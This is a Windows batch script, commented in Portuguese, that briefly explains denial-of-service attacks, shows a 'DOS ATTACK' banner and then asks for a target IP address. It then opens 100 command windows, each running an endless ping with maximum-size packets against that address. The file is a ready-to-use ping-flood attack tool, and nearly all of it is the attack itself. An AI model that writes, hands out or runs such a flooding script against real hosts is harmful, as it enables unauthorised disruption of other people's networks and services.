@echo off

CHCP 65001

ECHO.

ECHO O que é um ataque de negação de serviço?

ECHO.

ECHO    Um ataque de negação de serviço (DoS) é um tipo de ataque cibernético em que um ator malicioso tem por objetivo tornar um computador ou outro dispositivo indisponível para os usuários a que se destinam, interrompendo o funcionamento normal do dispositivo. Os ataques DoS normalmente funcionam sobrecarregando ou inundando uma máquina visada com solicitações até que o tráfego normal não possa ser processado, resultando em negação de serviço para usuários adicionais. Um ataque DoS caracteriza-se pelo uso de um único computador para lançar o ataque.

ECHO.
ECHO.

ECHO  /$$$$$$$   /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$$$$$   /$$$$$$  /$$   /$$
ECHO ^| $$__  $$ /$$__  $$ /$$__  $$       /$$__  $$^|__  $$__/^|__  $$__//$$__  $$ /$$__  $$^| $$  /$$/
ECHO ^| $$  \ $$^| $$  \ $$^| $$  \__/      ^| $$  \ $$   ^| $$      ^| $$  ^| $$  \ $$^| $$  \__/^| $$ /$$/
ECHO ^| $$  ^| $$^| $$  ^| $$^|  $$$$$$       ^| $$$$$$$$   ^| $$      ^| $$  ^| $$$$$$$$^| $$      ^| $$$$$/
ECHO ^| $$  ^| $$^| $$  ^| $$ \____  $$      ^| $$__  $$   ^| $$      ^| $$  ^| $$__  $$^| $$      ^| $$  $$
ECHO ^| $$  ^| $$^| $$  ^| $$ /$$  \ $$      ^| $$  ^| $$   ^| $$      ^| $$  ^| $$  ^| $$^| $$    $$^| $$\  $$
ECHO ^| $$$$$$$/^|  $$$$$$/^|  $$$$$$/      ^| $$  ^| $$   ^| $$      ^| $$  ^| $$  ^| $$^|  $$$$$$/^| $$ \  $$
ECHO ^|_______/  \______/  \______/       ^|__/  ^|__/   ^|__/      ^|__/  ^|__/  ^|__/ \______/ ^|__/  \__/

ECHO.
ECHO.

ECHO Digite o endereço ip que você deseja realizar o ataque DOS:

SET /P IP=

FOR /L %%i IN (1,1,100) DO CALL :PING

EXIT /B %ERRORLEVEL%

:PING
start cmd /k ping -t -l 65500 -4 %IP%
EXIT /B 0

EXIT
